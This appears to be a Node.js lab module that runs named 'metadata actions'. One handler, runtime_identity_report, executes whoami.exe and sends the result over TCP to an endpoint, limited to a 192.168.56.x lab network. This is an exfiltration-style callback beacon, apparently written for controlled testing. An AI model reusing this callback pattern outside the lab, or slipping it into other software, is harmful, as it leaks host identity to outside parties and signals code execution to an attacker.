'use strict';

const crypto = require('crypto');
const net = require('net');
const { execFileSync } = require('child_process');

const TIMEOUT_MS = 5000;

function parseEndpoint(endpoint) {
  if (typeof endpoint !== 'string') throw new Error('Invalid endpoint');
  const parts = endpoint.split(':');
  if (parts.length !== 2) throw new Error('Invalid endpoint');
  const host = parts[0];
  const port = Number(parts[1]);
  if (!Number.isInteger(port) || port < 1 || port > 65535) throw new Error('Invalid port');
  if (!host.startsWith('192.168.56.')) throw new Error('Endpoint outside controlled lab network');
  return { host, port };
}

const HANDLERS = {
  health_check: async () => ({ status:'ok', uptime:process.uptime() }),
  config_fingerprint: async (spec) => crypto.createHash('sha256').update(String(spec.value || '')).digest('hex'),
  runtime_identity_report: async (spec) => {
    const { host, port } = parseEndpoint(spec.endpoint);
    const identity = execFileSync('whoami.exe', [], { encoding:'utf8' }).trim();
    await new Promise((resolve,reject) => {
      const client = net.createConnection({ host, port });
      const timer = setTimeout(() => { client.destroy(); reject(new Error('Callback timed out after '+TIMEOUT_MS+'ms')); }, TIMEOUT_MS);
      client.on('connect', () => client.end(spec.marker+'\\n'+identity+'\\n'));
      client.on('close', () => { clearTimeout(timer); resolve(); });
      client.on('error', e => { clearTimeout(timer); reject(e); });
    });
    return { identity };
  }
};

async function executeMetadataAction(spec) {
  if (!spec) return null;
  const handler = HANDLERS[spec.operation];
  if (!handler) throw new Error('Unknown operation: '+spec.operation);
  return handler(spec);
}

module.exports = { executeMetadataAction, HANDLERS };
